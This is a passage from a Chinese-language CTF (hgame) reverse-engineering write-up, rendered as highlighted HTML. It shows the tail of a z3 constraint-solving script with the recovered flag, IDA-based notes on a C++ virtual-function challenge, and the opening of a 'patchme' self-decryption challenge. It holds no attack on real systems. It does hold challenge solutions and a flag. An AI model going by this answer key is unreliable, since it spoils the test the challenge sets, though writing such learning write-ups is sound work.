class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">12441</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">14434062</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16689</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token number\">10279</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">32918</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">57155</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">26571</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15086</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">22986</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">23349</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">16381</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">23173</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">40224</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">31751</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8421</span> <span class=\"token operator\">==</span> <span class=\"token number\">7433598</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">28740</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">64696</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">60470</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">14752</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">1287</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">35272</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">49467</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">33788</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">20606</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">44874</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19764</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">48342</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">56511</span> <span class=\"token operator\">==</span> <span class=\"token number\">7989404</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">28978</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23120</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">22802</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">31533</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">39287</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">48576</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">28542</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">43265</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">22365</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">61108</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2823</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">30343</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token number\">14780</span> <span class=\"token operator\">==</span> <span class=\"token number\">3504803</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">22466</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">55999</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">53658</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">47160</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">12511</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">59807</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">46242</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3052</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">25279</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token number\">30202</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">22698</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">33480</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">16757</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">11003580</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">57492</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">13421</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">13941</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">48092</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">38310</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9884</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      <span class=\"token number\">45500</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">19233</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">58274</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">36175</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">18568</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">49694</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">9473</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">25546210</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">23355</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">50164</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">34618</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      <span class=\"token number\">52703</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">36245</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">46648</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">4858</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">41846</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">27122</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">42058</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15676</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">31863</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">62510</span> <span class=\"token operator\">==</span> <span class=\"token number\">11333836</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30523</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">7990</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39058</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">57549</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">53440</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">4275</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">48863</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">55436</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">2624</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">13652</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">62231</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">19456</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">13195</span> <span class=\"token operator\">==</span> <span class=\"token number\">13863722</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>text<span class=\"token operator\">=</span><span class=\"token number\">47</span><span class=\"token operator\">*</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    text<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span>num<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">127</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 添加约束条件</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> sat<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 检测是否有解</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> num<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 因为最后得出的是等式，先遍历 temp，把 temp 的每个依次赋给 i</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        flag<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 然后找到每个 temp 对应的解，附加到空列表的后面</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'无解'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">236</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">133</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>text <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    text <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span>flag<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token triple-quoted-string string\">'''输出结果:</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>[236, 72, 213, 106, 189, 86, 62, 53, 120, 199, 15, 93, 133]</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>hgame&#123;z3_1s_very_u5eful_1n_rever5e_engin3ering&#125;'''</pre></td></tr></table></figure><p>这里注意后面的异或之后才是 flag</p>\n<p>每次用 z3 解 flag 都要用约束条件 32-127 才行不然就是乱码 不知道有没有别的解决办法</p>\n<p z3_1s_very_u5eful_1n_rever5e_engin3ering>flag 为 hgame</p>\n<h4 id=\"cpp\"><a class=\"markdownIt-Anchor\" href=\"#cpp\">#</a> Cpp</h4>\n<p>cpp 虚函数相关</p>\n<p>hint 给了个 pdb 文件 用 IDA 加载符号之后看 main 函数</p>\n<p><img data-src=\"/images/image-20230203145356862.png\" alt=\"image.png\"></p>\n<p>将 v8 的类型改成 encrypt2*，后面的函数调用就会非常清晰。(上图为改后，没想到这一步的也可以动态调试着做)</p>\n<p><img data-src=\"/images/image-20230203145629222.png\" alt=\"image.png\"></p>\n<p>func7 是判断 flag 正确与否的函数 那么 func2 func6 就是关键</p>\n<p><img data-src=\"/images/image-20230203145903551.png\" alt=\"image.png\"></p>\n<p>先在函数窗口找到 func7 提取出比较数据</p>\n<p>[0x28, 0x50, 0xC1, 0x23, 0x98, 0xA1, 0x41, 0x36, 0x4C, 0x31, 0xCB, 0x52, 0x90, 0xF1, 0xAC, 0xCC, 0x0F, 0x6C, 0x2A, 0x89, 0x7F, 0xDF, 0x11, 0x84, 0x7F, 0xE6, 0xA2, 0xE0, 0x59, 0xC7, 0xC5, 0x46, 0x5D, 0x29, 0x38, 0x93, 0xED, 0x15, 0x7A, 0xFF]</p>\n<p><img data-src=\"/images/image-20230203151215551.png\" alt=\"image.png\"></p>\n<p>func2 像是某种初始化，一系列赋值</p>\n<p>func6 就是异或加密</p>\n<p><img data-src=\"/images/image-20230203185923866.png\" alt=\"image.png\"></p>\n<p>重点就是提取出异或的数据</p>\n<p><img data-src=\"/images/image-20230203191542378.png\" alt=\"image.png\"></p>\n<p>这里看看 string2int 函数</p>\n<p><img data-src=\"/images/image-20230203192122620.png\" alt=\"image.png\"></p>\n<p>这看了 WP 还没搞懂… 等大佬们的博客 ing</p>\n<h4 id=\"patchme\"><a class=\"markdownIt-Anchor\" href=\"#patchme\">#</a> patchme</h4>\n<p>IDA 打开找到 main 函数</p>\n<p><img data-src=\"/images/image-20230204013212414.png\" alt=\"image.png\"></p>\n<p>根据题目 应该是要 patch 某个地方</p>\n<p><img data-src=\"/images/image-20230204013602004.png\" alt=\"image.png\"></p>\n<p>在 main 函数附近找到了一个在 main 函数之前执行的一个自解密函数</p>\n<p>idapython 的脚本进行异或操作</p>\n<figure class=\"highlight python\"><figcaption 